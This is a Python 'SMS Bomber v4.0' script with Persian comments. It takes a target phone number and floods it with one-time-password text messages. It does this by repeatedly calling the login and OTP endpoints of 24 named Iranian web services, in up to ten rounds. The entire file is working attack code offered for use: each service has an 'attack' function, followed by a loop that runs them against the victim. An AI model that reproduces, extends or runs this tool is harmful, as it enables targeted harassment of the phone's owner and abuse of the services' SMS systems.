#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import sys

class SMSBomber:
    def __init__(self, phone_number):
        self.phone = phone_number
        self.timeout = 15.0
        self.services = []
        self.setup_services()
    
    def setup_services(self):
        """تعریف تمام سرویس‌های SMS"""
        self.services = [
            {
                "name": "Gharar",
                "function": self.gharar_attack
            },
            {
                "name": "ArzDigital", 
                "function": self.arzdigital_attack
            },
            {
                "name": "Filimo",
                "function": self.filimo_attack
            },
            {
                "name": "Basalam",
                "function": self.basalam_attack
            },
            {
                "name": "Filmnet",
                "function": self.filmnet_attack
            },
            {
                "name": "Filimo School",
                "function": self.filimo_school_attack
            },
            {
                "name": "Divar",
                "function": self.divar_attack
            },
            {
                "name": "Tapsi",
                "function": self.tapsi_attack
            },
            {
                "name": "Abar Kelas",
                "function": self.abarkelas_attack
            },
            {
                "name": "Torob",
                "function": self.torob_attack
            },
            {
                "name": "Gap",
                "function": self.gap_attack
            },
            {
                "name": "Digikala",
                "function": self.digikala_attack
            },
            {
                "name": "Namava",
                "function": self.namava_attack
            },
            {
                "name": "MrBilit",
                "function": self.mrbilit_attack
            },
            {
                "name": "Jabama",
                "function": self.jabama_attack
            },
            {
                "name": "Appetit",
                "function": self.appetit_attack
            },
            {
                "name": "Karafs",
                "function": self.karafs_attack
            },
            {
                "name": "Pindo",
                "function": self.pindo_attack
            },
            {
                "name": "Azkivam",
                "function": self.azkivam_attack
            },
            {
                "name": "Tamashakhoneh",
                "function": self.tamashakhoneh_attack
            },
            {
                "name": "Behtarino",
                "function": self.behtarino_attack
            },
            {
                "name": "IApps",
                "function": self.iapps_attack
            },
            {
                "name": "Unitech", 
                "function": self.unitech_attack
            },
            {
                "name": "Okala",
                "function": self.okala_attack
            }
        ]
    
    def gharar_attack(self):
        """حمله به سرویس Gharar"""
        try:
            url = "https://gharar.ir/users/phone_number/"
            data = {
                "phone": self.phone,
                "termsConfirmed": "true"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest"
            }
            resp = requests.post(url, headers=headers, data=data, timeout=self.timeout)
            return resp.status_code
        except Exception:
            return 0

    def arzdigital_attack(self):
        """حمله به سرویس ArzDigital"""
        try:
            url = "https://idp.arzdigital.com/account/v1/send-otp-phone"
            payload = {
                "arcaptcha_token": "473337506026102972892018435914",
                "country_code": "+98",
                "phone_no": self.phone,
                "type": "login"
            }
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://accounts.arzdigital.com"
            }
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def filimo_attack(self):
        """حمله به سرویس Filimo"""
        try:
            url = "https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1"
            payload = {
                "temp_id": "322424",
                "account": self.phone,
                "codepass_type": "otp",
                "guid": "0D815F19-037A-6F0A-74C0-1064282ACA76"
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def basalam_attack(self):
        """حمله به سرویس Basalam"""
        try:
            url = "https://auth.basalam.com/captcha/otp-request"
            payload = {
                "mobile": self.phone,
                "client_id": "11",
                "login_by_backup_mobile": False
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def filmnet_attack(self):
        """حمله به سرویس Filmnet"""
        try:
            url = f"https://filmnet.ir/api-v2/access-token/users/{self.phone}/otp"
            r = requests.get(url, headers={"Accept": "application/json"}, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def filimo_school_attack(self):
        """حمله به سرویس Filimo School"""
        try:
            url = "https://app.filimo.school/api/auth/token"
            payload = {
                "phone": self.phone,
                "signup": False,
                "channel": "sms",
                "gtoken": None
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def divar_attack(self):
        """حمله به سرویس Divar"""
        try:
            url = "https://api.divar.ir/v5/auth/authenticate"
            payload = {"phone": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def tapsi_attack(self):
        """حمله به سرویس Tapsi"""
        try:
            import uuid
            url = "https://accounts-api.tapsi.ir/api/v1/sso-user/auth"
            payload = {
                "phone_number": self.phone,
                "session_id": f"{uuid.uuid4()}--{uuid.uuid4()}",
                "selected_step_key": "PROMPT_FOR_SMS_CODE"
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def abarkelas_attack(self):
        """حمله به سرویس Abar Kelas"""
        try:
            url = "https://abarkelas.ir/auth/register/"
            payload = {"phoneNumber": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def torob_attack(self):
        """حمله به سرویس Torob"""
        try:
            url = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.phone}"
            r = requests.get(url, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def gap_attack(self):
        """حمله به سرویس Gap"""
        try:
            url = f"https://core.gap.im/v1/user/add.json?mobile={self.phone}"
            r = requests.get(url, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def digikala_attack(self):
        """حمله به سرویس Digikala"""
        try:
            url = "https://api.digikala.com/v1/user/authenticate/"
            payload = {
                "backUrl": "/",
                "username": self.phone,
                "otp_call": False,
                "hash": None
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def namava_attack(self):
        """حمله به سرویس Namaava"""
        try:
            url = "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request"
            payload = {"UserName": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def mrbilit_attack(self):
        """حمله به سرویس MrBilit"""
        try:
            url = f"https://auth.mrbilit.ir/api/Token/send?mobile={self.phone}"
            r = requests.get(url, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def jabama_attack(self):
        """حمله به سرویس Jabama"""
        try:
            url = "https://gw.jabama.com/api/v4/account/send-code"
            payload = {"mobile": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def appetit_attack(self):
        """حمله به سرویس Appetit.fit"""
        try:
            url = "https://staging.api.appetit.fit/api/v2/login"
            payload = {"mobile": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def karafs_attack(self):
        """حمله به سرویس Karafs"""
        try:
            url = "https://v2.karafsapp.com/requestCode"
            payload = {
                "phoneNumber": self.phone,
                "market": "PWA"
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def pindo_attack(self):
        """حمله به سرویس Pindo"""
        try:
            url = "https://api.pindo.ir/v1/user/login-register/"
            payload = {"phone": self.phone}
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://www.pindo.ir"
            }
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def azkivam_attack(self):
        """حمله به سرویس Azkivam"""
        try:
            url = "https://api.azkivam.com/auth/login"
            payload = {"mobileNumber": self.phone}
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://azkivam.com"
            }
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def tamashakhoneh_attack(self):
        """حمله به سرویس Tamashakhoneh"""
        try:
            url_register = "https://api.tamashakhoneh.ir/v4/auth/register"
            url_otp = "https://api.tamashakhoneh.ir/v4/auth/otp"
            
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://tmk.ir",
                "user_agent": "web-Safari,18.5,direct,4.1.1",
                "x-platform": "0"
            }
            
            payload = {"mobile": self.phone}
            
            # اول ثبت‌نام
            resp = requests.post(url_register, json=payload, headers=headers, timeout=self.timeout)
            
            # اگر کاربر وجود داشت، OTP بفرست
            if resp.status_code == 409:
                resp = requests.post(url_otp, json=payload, headers=headers, timeout=self.timeout)
            
            return resp.status_code
        except Exception:
            return 0

    def behtarino_attack(self):
        """حمله به سرویس Behtarino"""
        try:
            url = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
            payload = {"phone": self.phone}
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://behtarino.com",
                "site": "behtarino",
                "Accept": "application/json"
            }
            r = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return r.status_code
        except Exception:
            return 0

    def iapps_attack(self):
        """حمله به سرویس IApps"""
        try:
            url = "https://api.iapps.ir/accounts/otp/generate"
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://app.iapps.ir",
                "x-browser-name": "Chrome",
                "x-browser-version": "140",
                "x-device": "Desktop, Emulator",
                "x-device-type": "Desktop",
                "x-hardware-vendor": "Unknown",
                "x-platform": "Windows",
                "x-platform-version": "Unknown"
            }
            
            # فرمت شماره برای IApps: +989123456789
            phone_formatted = f"+98{self.phone[1:]}" if self.phone.startswith('09') else self.phone
            
            payload = {
                "phoneNumber": phone_formatted
            }
            
            resp = requests.post(url, headers=headers, json=payload, timeout=self.timeout)
            return resp.status_code
        except Exception:
            return 0

    def unitech_attack(self):
        """حمله به سرویس Unitech"""
        try:
            url = "https://api.unitech.ir/api/otp"
            payload = {
                "cellphone": self.phone
            }
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://unitech.ir"
            }
            response = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return response.status_code
        except Exception:
            return 0

    def okala_attack(self):
        """حمله به سرویس Okala"""
        try:
            # اول چک کردن وجود کاربر
            url_check = f"https://apigateway.okala.com/api/voyager/C/CustomerAccount/CheckHasPassword?mobile={self.phone}"
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.okala.com"
            }
            
            # سپس ارسال OTP
            url_otp = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
            headers_otp = {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Origin": "https://www.okala.com"
            }
            
            payload_otp = {
                "mobile": self.phone,
                "confirmTerms": True,
                "notRobot": False,
                "ValidationCodeCreateReason": 5,
                "OtpApp": 0,
                "IsAppOnly": False,
                "deviceTypeCode": 7
            }
            
            # فقط ارسال OTP (چک کردن لازم نیست)
            resp = requests.post(url_otp, headers=headers_otp, json=payload_otp, timeout=self.timeout)
            return resp.status_code
        except Exception:
            return 0

    def single_attack(self, count=1):
        """انجام حمله تکی"""
        print(f"\n🚀 شروع حمله به شماره: {self.phone}")
        print(f"📞 تعداد درخواست‌ها: {count}")
        print(f"🛠️ تعداد سرویس‌ها: {len(self.services)}")
        print("=" * 50)
        
        successful_attacks = 0
        total_attacks = 0
        
        for i in range(count):
            print(f"\n🌀 دور {i+1} از {count}")
            
            round_success = 0
            round_total = 0
            
            # اجرای تمام سرویس‌ها
            for service in self.services:
                try:
                    http_code = service["function"]()
                    round_total += 1
                    total_attacks += 1
                    
                    if http_code in [200, 201, 204]:
                        round_success += 1
                        successful_attacks += 1
                    
                    time.sleep(0.5)  # تاخیر بین سرویس‌ها
                    
                except Exception:
                    round_total += 1
                    total_attacks += 1
            
            # گزارش این دور
            print(f"✅ موفق این دور: {round_success}")
            print(f"📤 کل این دور: {round_total}")
            
            # تاخیر بین دورها (به جز دور آخر)
            if i < count - 1:
                print(f"⏳ منتظر 2 ثانیه برای دور بعدی...")
                time.sleep(2)
        
        # گزارش نهایی
        print(f"\n🎯 نتیجه نهایی")
        print("=" * 50)
        print(f"📞 شماره: {self.phone}")
        print(f"🌀 دورهای انجام شده: {count}")
        print(f"✅ درخواست‌های موفق: {successful_attacks}")
        print(f"📤 کل درخواست‌ها: {total_attacks}")
        
        if total_attacks > 0:
            success_rate = (successful_attacks / total_attacks) * 100
            print(f"📊 درصد موفقیت: {success_rate:.1f}%")
        
        print(f"🛠️ تعداد سرویس‌ها: {len(self.services)}")
        print(f"✅ حمله پایان یافت")

def main():
    """تابع اصلی"""
    print("💣 SMS Bomber v4.0")
    print("🛠️  با 24 سرویس مختلف")
    print("=" * 50)
    
    # دریافت شماره تلفن
    phone = input("📱 لطفا شماره تلفن را وارد کنید (مثال: 09123456789): ").strip()
    
    if not phone:
        print("❌ شماره تلفن نمی‌تواند خالی باشد!")
        return
    
    if not phone.startswith('09') or len(phone) != 11:
        print("❌ شماره تلفن نامعتبر!")
        return
    
    # دریافت تعداد دورها
    try:
        count = int(input("🔢 تعداد دورهای حمله را وارد کنید (1-10): ").strip())
        if count < 1 or count > 10:
            print("❌ تعداد باید بین 1 تا 10 باشد!")
            return
    except ValueError:
        print("❌ تعداد باید یک عدد باشد!")
        return
    
    # ایجاد شیء بمبر و اجرای حمله
    bomber = SMSBomber(phone)
    bomber.single_attack(count)

if __name__ == "__main__":
    main()
